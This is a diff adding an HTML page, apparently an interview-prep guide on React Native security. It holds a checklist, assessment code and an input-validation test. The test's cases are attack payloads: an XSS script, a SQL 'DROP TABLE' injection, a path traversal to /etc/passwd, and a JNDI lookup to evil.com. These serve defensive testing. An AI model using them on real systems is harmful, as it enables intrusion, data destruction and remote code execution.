@@ -1,0 +1,1452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ Security Best Practices - Interview Prep Documentation</title>
+    <meta name="description" content="Comprehensive guides for JavaScript, TypeScript, and React Native interview preparation">
+    
+    <!-- GitHub Pages compatible styling -->
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+        }
+        
+        .container {
+            max-width: 100%;
+        }
+        
+        h1, h2, h3, h4, h5, h6 {
+            color: #2c3e50;
+            margin-top: 2em;
+            margin-bottom: 1em;
+        }
+        
+        h1 {
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+        }
+        
+        h2 {
+            border-bottom: 1px solid #ecf0f1;
+            padding-bottom: 5px;
+        }
+        
+        code {
+            background-color: #f8f9fa;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            font-size: 0.9em;
+        }
+        
+        pre {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border-left: 4px solid #3498db;
+        }
+        
+        pre code {
+            background-color: transparent;
+            padding: 0;
+        }
+        
+        blockquote {
+            border-left: 4px solid #3498db;
+            margin: 0;
+            padding-left: 20px;
+            color: #666;
+            font-style: italic;
+        }
+        
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            margin: 1em 0;
+        }
+        
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px 12px;
+            text-align: left;
+        }
+        
+        th {
+            background-color: #f8f9fa;
+            font-weight: bold;
+        }
+        
+        tr:nth-child(even) {
+            background-color: #f8f9fa;
+        }
+        
+        .navigation {
+            background-color: #2c3e50;
+            color: white;
+            padding: 10px 0;
+            margin-bottom: 20px;
+        }
+        
+        .navigation a {
+            color: white;
+            text-decoration: none;
+            margin-right: 20px;
+        }
+        
+        .navigation a:hover {
+            text-decoration: underline;
+        }
+        
+        .breadcrumb {
+            margin-bottom: 20px;
+            color: #666;
+        }
+        
+        .breadcrumb a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            h1 {
+                font-size: 1.8em;
+            }
+            
+            h2 {
+                font-size: 1.4em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <nav class="navigation">
+            <a href="/">Home</a>
+            <a href="/Javascript/">JavaScript</a>
+            <a href="/TypeScript/">TypeScript</a>
+            <a href="/React-Native/">React Native</a>
+        </nav>
+        
+        
+        
+        <main>
+            <h1 id="️-security-best-practices">🛡️ <strong>Security Best Practices</strong></h1>
+
+<blockquote>
+  <p><strong>Master security best practices, vulnerability assessment, and security implementation for React Native applications</strong></p>
+</blockquote>
+
+<link rel="stylesheet" href="../../common-styles.css" />
+
+<hr />
+
+<h2 id="-table-of-contents">📚 <strong>Table of Contents</strong></h2>
+
+<ul>
+  <li><a href="#-security-best-practices-overview">Security Best Practices Overview</a></li>
+  <li><a href="#-vulnerability-assessment">Vulnerability Assessment</a></li>
+  <li><a href="#-security-implementation">Security Implementation</a></li>
+  <li><a href="#-security-monitoring">Security Monitoring</a></li>
+  <li><a href="#-incident-response">Incident Response</a></li>
+  <li><a href="#-best-practices">Best Practices</a></li>
+  <li><a href="#-interview-questions">Interview Questions</a></li>
+</ul>
+
+<hr />
+
+<h2 id="️-security-best-practices-overview">🏗️ <strong>Security Best Practices Overview</strong></h2>
+
+<h3 id="security-framework"><strong>Security Framework</strong></h3>
+
+<pre><code class="language-mermaid">graph TD
+    A[Security Assessment] --&gt; B[Threat Modeling]
+    B --&gt; C[Security Implementation]
+    C --&gt; D[Security Testing]
+    D --&gt; E[Security Monitoring]
+    E --&gt; F[Incident Response]
+    F --&gt; A
+    
+    G[Code Review] --&gt; C
+    H[Penetration Testing] --&gt; D
+    I[Security Audits] --&gt; E
+</code></pre>
+
+<h3 id="security-principles"><strong>Security Principles</strong></h3>
+<ul>
+  <li><strong>Defense in Depth</strong>: Multiple security layers</li>
+  <li><strong>Least Privilege</strong>: Minimum necessary access</li>
+  <li><strong>Fail Secure</strong>: Secure by default</li>
+  <li><strong>Security by Design</strong>: Built-in security</li>
+</ul>
+
+<hr />
+
+<h2 id="-vulnerability-assessment">🔍 <strong>Vulnerability Assessment</strong></h2>
+
+<h3 id="security-checklist"><strong>Security Checklist</strong></h3>
+
+<p><button onclick="copyCode(this)" class="copy-btn">📋 Copy</button></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Security assessment checklist</span>
+<span class="kd">const</span> <span class="nx">SECURITY_CHECKLIST</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="c1">// Authentication &amp; Authorization</span>
+  <span class="na">authentication</span><span class="p">:</span> <span class="p">{</span>
+    <span class="na">strongPasswords</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">multiFactorAuth</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">biometricAuth</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">sessionManagement</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">tokenSecurity</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+  <span class="p">},</span>
+  
+  <span class="c1">// Data Protection</span>
+  <span class="na">dataProtection</span><span class="p">:</span> <span class="p">{</span>
+    <span class="na">encryptionAtRest</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">encryptionInTransit</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">keyManagement</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">dataClassification</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">secureStorage</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+  <span class="p">},</span>
+  
+  <span class="c1">// Network Security</span>
+  <span class="na">networkSecurity</span><span class="p">:</span> <span class="p">{</span>
+    <span class="na">certificatePinning</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">tlsConfiguration</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">apiSecurity</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">requestValidation</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">responseValidation</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+  <span class="p">},</span>
+  
+  <span class="c1">// Code Security</span>
+  <span class="na">codeSecurity</span><span class="p">:</span> <span class="p">{</span>
+    <span class="na">inputValidation</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">outputEncoding</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">sqlInjection</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">xssProtection</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">csrfProtection</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+  <span class="p">},</span>
+  
+  <span class="c1">// Platform Security</span>
+  <span class="na">platformSecurity</span><span class="p">:</span> <span class="p">{</span>
+    <span class="na">permissions</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">secureCommunication</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">appSigning</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">codeObfuscation</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+    <span class="na">antiTampering</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+  <span class="p">},</span>
+<span class="p">};</span>
+
+<span class="c1">// Security assessment service</span>
+<span class="kd">const</span> <span class="nx">createSecurityAssessmentService</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">assessmentResults</span> <span class="o">=</span> <span class="p">{</span> <span class="p">...</span><span class="nx">SECURITY_CHECKLIST</span> <span class="p">};</span>
+  
+  <span class="k">return</span> <span class="p">{</span>
+    <span class="c1">// Run security assessment</span>
+    <span class="na">runAssessment</span><span class="p">:</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">try</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Starting security assessment...</span><span class="dl">'</span><span class="p">);</span>
+        
+        <span class="c1">// Check authentication security</span>
+        <span class="k">await</span> <span class="nx">assessAuthenticationSecurity</span><span class="p">();</span>
+        
+        <span class="c1">// Check data protection</span>
+        <span class="k">await</span> <span class="nx">assessDataProtection</span><span class="p">();</span>
+        
+        <span class="c1">// Check network security</span>
+        <span class="k">await</span> <span class="nx">assessNetworkSecurity</span><span class="p">();</span>
+        
+        <span class="c1">// Check code security</span>
+        <span class="k">await</span> <span class="nx">assessCodeSecurity</span><span class="p">();</span>
+        
+        <span class="c1">// Check platform security</span>
+        <span class="k">await</span> <span class="nx">assessPlatformSecurity</span><span class="p">();</span>
+        
+        <span class="c1">// Generate report</span>
+        <span class="kd">const</span> <span class="nx">report</span> <span class="o">=</span> <span class="nx">generateSecurityReport</span><span class="p">(</span><span class="nx">assessmentResults</span><span class="p">);</span>
+        
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Security assessment completed</span><span class="dl">'</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">report</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Security assessment failed:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+        <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Get assessment results</span>
+    <span class="na">getResults</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">assessmentResults</span><span class="p">,</span>
+    
+    <span class="c1">// Update assessment result</span>
+    <span class="na">updateResult</span><span class="p">:</span> <span class="p">(</span><span class="nx">category</span><span class="p">,</span> <span class="nx">item</span><span class="p">,</span> <span class="nx">result</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">assessmentResults</span><span class="p">[</span><span class="nx">category</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">assessmentResults</span><span class="p">[</span><span class="nx">category</span><span class="p">][</span><span class="nx">item</span><span class="p">]</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">assessmentResults</span><span class="p">[</span><span class="nx">category</span><span class="p">][</span><span class="nx">item</span><span class="p">]</span> <span class="o">=</span> <span class="nx">result</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+  <span class="p">};</span>
+<span class="p">};</span>
+
+<span class="c1">// Assess authentication security</span>
+<span class="kd">const</span> <span class="nx">assessAuthenticationSecurity</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="c1">// Check if strong passwords are enforced</span>
+    <span class="kd">const</span> <span class="nx">strongPasswords</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">checkStrongPasswordPolicy</span><span class="p">();</span>
+    <span class="nx">updateResult</span><span class="p">(</span><span class="dl">'</span><span class="s1">authentication</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">strongPasswords</span><span class="dl">'</span><span class="p">,</span> <span class="nx">strongPasswords</span><span class="p">);</span>
+    
+    <span class="c1">// Check if MFA is implemented</span>
+    <span class="kd">const</span> <span class="nx">mfa</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">checkMultiFactorAuth</span><span class="p">();</span>
+    <span class="nx">updateResult</span><span class="p">(</span><span class="dl">'</span><span class="s1">authentication</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">multiFactorAuth</span><span class="dl">'</span><span class="p">,</span> <span class="nx">mfa</span><span class="p">);</span>
+    
+    <span class="c1">// Check if biometric auth is available</span>
+    <span class="kd">const</span> <span class="nx">biometric</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">checkBiometricAuth</span><span class="p">();</span>
+    <span class="nx">updateResult</span><span class="p">(</span><span class="dl">'</span><span class="s1">authentication</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">biometricAuth</span><span class="dl">'</span><span class="p">,</span> <span class="nx">biometric</span><span class="p">);</span>
+    
+    <span class="c1">// Check session management</span>
+    <span class="kd">const</span> <span class="nx">sessionMgmt</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">checkSessionManagement</span><span class="p">();</span>
+    <span class="nx">updateResult</span><span class="p">(</span><span class="dl">'</span><span class="s1">authentication</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">sessionManagement</span><span class="dl">'</span><span class="p">,</span> <span class="nx">sessionMgmt</span><span class="p">);</span>
+    
+    <span class="c1">// Check token security</span>
+    <span class="kd">const</span> <span class="nx">tokenSecurity</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">checkTokenSecurity</span><span class="p">();</span>
+    <span class="nx">updateResult</span><span class="p">(</span><span class="dl">'</span><span class="s1">authentication</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">tokenSecurity</span><span class="dl">'</span><span class="p">,</span> <span class="nx">tokenSecurity</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Authentication security assessment failed:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="c1">// Assess data protection</span>
+<span class="kd">const</span> <span class="nx">assessDataProtection</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="c1">// Check encryption at rest</span>
+    <span class="kd">const</span> <span class="nx">encryptionAtRest</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">checkEncryptionAtRest</span><span class="p">();</span>
+    <span class="nx">updateResult</span><span class="p">(</span><span class="dl">'</span><span class="s1">dataProtection</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">encryptionAtRest</span><span class="dl">'</span><span class="p">,</span> <span class="nx">encryptionAtRest</span><span class="p">);</span>
+    
+    <span class="c1">// Check encryption in transit</span>
+    <span class="kd">const</span> <span class="nx">encryptionInTransit</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">checkEncryptionInTransit</span><span class="p">();</span>
+    <span class="nx">updateResult</span><span class="p">(</span><span class="dl">'</span><span class="s1">dataProtection</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">encryptionInTransit</span><span class="dl">'</span><span class="p">,</span> <span class="nx">encryptionInTransit</span><span class="p">);</span>
+    
+    <span class="c1">// Check key management</span>
+    <span class="kd">const</span> <span class="nx">keyManagement</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">checkKeyManagement</span><span class="p">();</span>
+    <span class="nx">updateResult</span><span class="p">(</span><span class="dl">'</span><span class="s1">dataProtection</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">keyManagement</span><span class="dl">'</span><span class="p">,</span> <span class="nx">keyManagement</span><span class="p">);</span>
+    
+    <span class="c1">// Check data classification</span>
+    <span class="kd">const</span> <span class="nx">dataClassification</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">checkDataClassification</span><span class="p">();</span>
+    <span class="nx">updateResult</span><span class="p">(</span><span class="dl">'</span><span class="s1">dataProtection</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">dataClassification</span><span class="dl">'</span><span class="p">,</span> <span class="nx">dataClassification</span><span class="p">);</span>
+    
+    <span class="c1">// Check secure storage</span>
+    <span class="kd">const</span> <span class="nx">secureStorage</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">checkSecureStorage</span><span class="p">();</span>
+    <span class="nx">updateResult</span><span class="p">(</span><span class="dl">'</span><span class="s1">dataProtection</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">secureStorage</span><span class="dl">'</span><span class="p">,</span> <span class="nx">secureStorage</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Data protection assessment failed:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="c1">// Generate security report</span>
+<span class="kd">const</span> <span class="nx">generateSecurityReport</span> <span class="o">=</span> <span class="p">(</span><span class="nx">results</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">totalChecks</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">results</span><span class="p">).</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">total</span><span class="p">,</span> <span class="nx">category</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">total</span> <span class="o">+</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">category</span><span class="p">).</span><span class="nx">length</span><span class="p">;</span>
+  <span class="p">},</span> <span class="mi">0</span><span class="p">);</span>
+  
+  <span class="kd">const</span> <span class="nx">passedChecks</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">results</span><span class="p">).</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">total</span><span class="p">,</span> <span class="nx">category</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">total</span> <span class="o">+</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">category</span><span class="p">).</span><span class="nx">filter</span><span class="p">(</span><span class="nx">result</span> <span class="o">=&gt;</span> <span class="nx">result</span> <span class="o">===</span> <span class="kc">true</span><span class="p">).</span><span class="nx">length</span><span class="p">;</span>
+  <span class="p">},</span> <span class="mi">0</span><span class="p">);</span>
+  
+  <span class="kd">const</span> <span class="nx">securityScore</span> <span class="o">=</span> <span class="p">(</span><span class="nx">passedChecks</span> <span class="o">/</span> <span class="nx">totalChecks</span><span class="p">)</span> <span class="o">*</span> <span class="mi">100</span><span class="p">;</span>
+  
+  <span class="k">return</span> <span class="p">{</span>
+    <span class="nx">securityScore</span><span class="p">,</span>
+    <span class="nx">totalChecks</span><span class="p">,</span>
+    <span class="nx">passedChecks</span><span class="p">,</span>
+    <span class="na">failedChecks</span><span class="p">:</span> <span class="nx">totalChecks</span> <span class="o">-</span> <span class="nx">passedChecks</span><span class="p">,</span>
+    <span class="nx">results</span><span class="p">,</span>
+    <span class="na">recommendations</span><span class="p">:</span> <span class="nx">generateRecommendations</span><span class="p">(</span><span class="nx">results</span><span class="p">),</span>
+  <span class="p">};</span>
+<span class="p">};</span>
+
+<span class="c1">// Generate security recommendations</span>
+<span class="kd">const</span> <span class="nx">generateRecommendations</span> <span class="o">=</span> <span class="p">(</span><span class="nx">results</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">recommendations</span> <span class="o">=</span> <span class="p">[];</span>
+  
+  <span class="c1">// Authentication recommendations</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">.</span><span class="nx">authentication</span><span class="p">.</span><span class="nx">strongPasswords</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">recommendations</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="dl">'</span><span class="s1">Implement strong password policy</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">.</span><span class="nx">authentication</span><span class="p">.</span><span class="nx">multiFactorAuth</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">recommendations</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="dl">'</span><span class="s1">Implement multi-factor authentication</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">.</span><span class="nx">authentication</span><span class="p">.</span><span class="nx">biometricAuth</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">recommendations</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="dl">'</span><span class="s1">Add biometric authentication support</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="c1">// Data protection recommendations</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">.</span><span class="nx">dataProtection</span><span class="p">.</span><span class="nx">encryptionAtRest</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">recommendations</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="dl">'</span><span class="s1">Implement encryption at rest</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">.</span><span class="nx">dataProtection</span><span class="p">.</span><span class="nx">encryptionInTransit</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">recommendations</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="dl">'</span><span class="s1">Implement encryption in transit</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">.</span><span class="nx">dataProtection</span><span class="p">.</span><span class="nx">keyManagement</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">recommendations</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="dl">'</span><span class="s1">Implement proper key management</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="c1">// Network security recommendations</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">.</span><span class="nx">networkSecurity</span><span class="p">.</span><span class="nx">certificatePinning</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">recommendations</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="dl">'</span><span class="s1">Implement certificate pinning</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">.</span><span class="nx">networkSecurity</span><span class="p">.</span><span class="nx">tlsConfiguration</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">recommendations</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="dl">'</span><span class="s1">Configure proper TLS settings</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="k">return</span> <span class="nx">recommendations</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="c1">// Export security assessment functions</span>
+<span class="k">export</span> <span class="p">{</span>
+  <span class="nx">createSecurityAssessmentService</span><span class="p">,</span>
+  <span class="nx">generateSecurityReport</span><span class="p">,</span>
+  <span class="nx">generateRecommendations</span><span class="p">,</span>
+  <span class="nx">SECURITY_CHECKLIST</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<h3 id="security-testing"><strong>Security Testing</strong></h3>
+
+<p><button onclick="copyCode(this)" class="copy-btn">📋 Copy</button></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Security testing utilities</span>
+<span class="kd">const</span> <span class="nx">createSecurityTestingService</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="p">{</span>
+    <span class="c1">// Test input validation</span>
+    <span class="na">testInputValidation</span><span class="p">:</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">testCases</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="p">{</span> <span class="na">input</span><span class="p">:</span> <span class="dl">'</span><span class="s1">&lt;script&gt;alert("xss")&lt;/script&gt;</span><span class="dl">'</span><span class="p">,</span> <span class="na">expected</span><span class="p">:</span> <span class="dl">'</span><span class="s1">sanitized</span><span class="dl">'</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">input</span><span class="p">:</span> <span class="dl">"</span><span class="s2">'; DROP TABLE users; --</span><span class="dl">"</span><span class="p">,</span> <span class="na">expected</span><span class="p">:</span> <span class="dl">'</span><span class="s1">sanitized</span><span class="dl">'</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">input</span><span class="p">:</span> <span class="dl">'</span><span class="s1">../../../etc/passwd</span><span class="dl">'</span><span class="p">,</span> <span class="na">expected</span><span class="p">:</span> <span class="dl">'</span><span class="s1">sanitized</span><span class="dl">'</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">input</span><span class="p">:</span> <span class="dl">'</span><span class="s1">${jndi:ldap://evil.com/a}</span><span class="dl">'</span><span class="p">,</span> <span class="na">expected</span><span class="p">:</span> <span class="dl">'</span><span class="s1">sanitized</span><span class="dl">'</span> <span class="p">},</span>
+      <span class="p">];</span>
+      
+      <span class="kd">const</span> <span class="nx">results</span> <span class="o">=</span> <span class="p">[];</span>
+      
+      <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">testCase</span> <span class="k">of</span> <span class="nx">testCases</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+          <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">testInput</span><span class="p">(</span><span class="nx">testCase</span><span class="p">.</span><span class="nx">input</span><span class="p">);</span>
+          <span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
+            <span class="na">input</span><span class="p">:</span> <span class="nx">testCase</span><span class="p">.</span><span class="nx">input</span><span class="p">,</span>
+            <span class="na">expected</span><span class="p">:</span> <span class="nx">testCase</span><span class="p">.</span><span class="nx">expected</span><span class="p">,</span>
+            <span class="na">actual</span><span class="p">:</span> <span class="nx">result</span><span class="p">,</span>
+            <span class="na">passed</span><span class="p">:</span> <span class="nx">result</span> <span class="o">===</span> <span class="nx">testCase</span><span class="p">.</span><span class="nx">expected</span><span class="p">,</span>
+          <span class="p">});</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">results</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
+            <span class="na">input</span><span class="p">:</span> <span class="nx">testCase</span><span class="p">.</span><span class="nx">input</span><span class="p">,</span>
+            <span class="na">expected</span><span class="p">:</span> <span class="nx">testCase</span><span class="p">.</span><span class="nx">expected</span><span class="p">,</span>
+            <span class="na">actual</span><span class="p">:</span> <span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span>
+            <span class="na">passed</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+            <span class="na">error</span><span class="p">:</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">,</span>
+          <span class="p">});</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      
+      <span class="k">return</span> <span class="nx">results</span><span class="p">;</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Test authentication security</span>
+    <span class="na">testAuthenticationSecurity</span><span class="p">:</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">tests</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Weak Password</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testWeakPassword</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Session Timeout</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testSessionTimeout</span> <span class="p">},</span>
+        <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Token Expiry</span><span class="dl">'</span><span class="p">,</span> <span class="na">test</span><span class="p">:</span> <span class="nx">testTokenExpiry</span> <span class="p">},</span>
